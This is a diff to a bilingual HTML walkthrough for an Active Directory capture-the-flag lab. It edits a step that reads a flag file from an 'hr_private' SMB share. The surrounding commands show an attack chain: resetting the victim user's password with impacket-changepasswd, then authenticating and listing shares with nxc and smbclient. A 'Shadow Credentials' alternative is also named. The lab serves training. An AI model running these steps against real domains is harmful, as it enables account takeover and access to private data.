@@ -45,7 +45,8 @@ impacket-changepasswd '{{ ad_realm_lower }}/m.davis'@{{ ad_dc_ip }} \
     <h3>3 · Autenticarse como la víctima y capturar la flag</h3>
     <pre>nxc smb {{ ad_dc_ip }} -u 'm.davis' -p 'NewP@ss123!' --shares
 
-smbclient //{{ ad_dc_ip }}/hr_private -U '{{ ad_domain }}\m.davis%NewP@ss123!' -c 'get flag-ad-08.txt -'</pre>
+smbclient //{{ ad_dc_ip }}/hr_private -U '{{ ad_domain }}\m.davis%NewP@ss123!' -c 'get flag-ad-08.txt'
+cat flag-ad-08.txt</pre>
     <pre>HL{···}</pre>
 
     <h3>4 · Alternativa sigilosa: Shadow Credentials</h3>
@@ -88,7 +89,8 @@ impacket-changepasswd '{{ ad_realm_lower }}/m.davis'@{{ ad_dc_ip }} \
     <h3>3 · Authenticate as the victim and capture the flag</h3>
     <pre>nxc smb {{ ad_dc_ip }} -u 'm.davis' -p 'NewP@ss123!' --shares
 
-smbclient //{{ ad_dc_ip }}/hr_private -U '{{ ad_domain }}\m.davis%NewP@ss123!' -c 'get flag-ad-08.txt -'</pre>
+smbclient //{{ ad_dc_ip }}/hr_private -U '{{ ad_domain }}\m.davis%NewP@ss123!' -c 'get flag-ad-08.txt'
+cat flag-ad-08.txt</pre>
     <pre>HL{···}</pre>
 
     <h3>4 · Stealthier alternative: Shadow Credentials</h3>
